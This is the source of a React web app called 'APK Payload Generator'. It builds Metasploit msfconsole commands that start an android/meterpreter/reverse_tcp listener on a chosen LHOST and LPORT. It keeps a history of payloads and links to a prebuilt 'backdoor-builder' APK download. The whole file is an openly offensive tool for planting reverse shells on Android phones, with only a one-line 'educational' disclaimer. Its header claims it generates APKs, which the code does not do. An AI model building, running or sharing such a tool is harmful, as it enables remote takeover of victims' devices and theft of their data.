import React, { useState, useEffect } from 'react';
import './App.css';
import { persistence } from './utils/persistence';

type Payload = {
  id: string;
  name: string;
  lhost: string;
  lport: string;
};

const App: React.FC = () => {
  const [lhost, setLhost] = useState('192.168.92.128');
  const [lport, setLport] = useState('4444');
  const [payloadName, setPayloadName] = useState('');
  const [payloads, setPayloads] = useState<Payload[]>([]);
  const [selectedPayload, setSelectedPayload] = useState<Payload | null>(null);

  useEffect(() => {
    // Load payloads from persistent storage on component mount
    const loadPayloads = async () => {
      try {
        const data = await persistence.getItem('payloads');
        if (data) {
          setPayloads(JSON.parse(data));
        }
      } catch (error) {
        console.error('Failed to load payloads:', error);
      }
    };
    loadPayloads();
  }, []);

  useEffect(() => {
    // Save payloads to persistent storage whenever they change
    const savePayloads = async () => {
      try {
        await persistence.setItem('payloads', JSON.stringify(payloads));
      } catch (error) {
        console.error('Failed to save payloads:', error);
      }
    };
    savePayloads();
  }, [payloads]);

  const addPayload = () => {
    if (!payloadName || !lhost || !lport) return;

    const newPayload: Payload = {
      id: Date.now().toString(),
      name: payloadName,
      lhost,
      lport,
    };

    setPayloads([...payloads, newPayload]);
    setPayloadName('');
  };

  const removePayload = (id: string) => {
    setPayloads(payloads.filter((p) => p.id !== id));
    if (selectedPayload && selectedPayload.id === id) {
      setSelectedPayload(null);
    }
  };

  const generateCommand = (p: Payload) => {
    return `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${p.lhost}; set LPORT ${p.lport}; exploit;"`;
  };

  return (
    <div className="app">
      <header className="header">
        <h1>APK Payload Generator</h1>
        <p>Generate an APK with a reverse TCP payload for use with Metasploit.</p>
      </header>

      <main className="main">
        <section className="form-section">
          <h2>Configuration</h2>
          <div className="form-group">
            <label htmlFor="lhost">LHOST (Your IP)</label>
            <input
              id="lhost"
              type="text"
              value={lhost}
              onChange={(e) => setLhost(e.target.value)}
              placeholder="e.g., 192.168.92.128"
            />
          </div>
          <div className="form-group">
            <label htmlFor="lport">LPORT (Your Port)</label>
            <input
              id="lport"
              type="number"
              value={lport}
              onChange={(e) => setLport(e.target.value)}
              placeholder="e.g., 4444"
            />
          </div>
          <div className="form-group">
            <label htmlFor="name">Payload Name</label>
            <input
              id="name"
              type="text"
              value={payloadName}
              onChange={(e) => setPayloadName(e.target.value)}
              placeholder="e.g., MyPayload"
            />
          </div>
          <button className="add-btn" onClick={addPayload}>
            Add Payload
          </button>
        </section>

        <section className="list-section">
          <h2>Payload History</h2>
          {payloads.length === 0 ? (
            <p>No payloads yet. Add one above!</p>
          ) : (
            <ul className="payload-list">
              {payloads.map((p) => (
                <li key={p.id} className="payload-item">
                  <div className="payload-info">
                    <strong>{p.name}</strong>
                    <span>{p.lhost}:{p.lport}</span>
                  </div>
                  <div className="payload-actions">
                    <button
                      className="select-btn"
                      onClick={() => setSelectedPayload(p)}
                    >
                      Select
                    </button>
                    <button
                      className="copy-btn"
                      onClick={() => {
                        navigator.clipboard.writeText(generateCommand(p));
                        alert('Command copied to clipboard!');
                      }}
                    >
                      Copy Command
                    </button>
                    <button
                      className="delete-btn"
                      onClick={() => removePayload(p.id)}
                    >
                      Delete
                    </button>
                  </div>
                </li>
              ))}
            </ul>
          )}
        </section>

        {selectedPayload && (
          <section className="command-section">
            <h2>Selected Payload Command</h2>
            <pre className="command">{generateCommand(selectedPayload)}</pre>
            <button
              className="copy-btn"
              onClick={() => {
                navigator.clipboard.writeText(generateCommand(selectedPayload));
                alert('Command copied to clipboard!');
              }}
            >
              Copy
            </button>
          </section>
        )}

        <section className="download-section">
          <h2>Download APK</h2>
          <p>Replace the placeholder URL below with the actual URL of your APK file.</p>
          <a
            href="https://github.com/fallag777/backdoor-builder/releases/download/v1.0/test1.apk"
            target="_blank"
            rel="noopener noreferrer"
            className="download-link"
          >
            Download APK
          </a>
        </section>
      </main>

      <footer className="footer">
        <p>Disclaimer: This tool is for educational and authorized security testing purposes only.</p>
      </footer>
    </div>
  );
};

export default App;
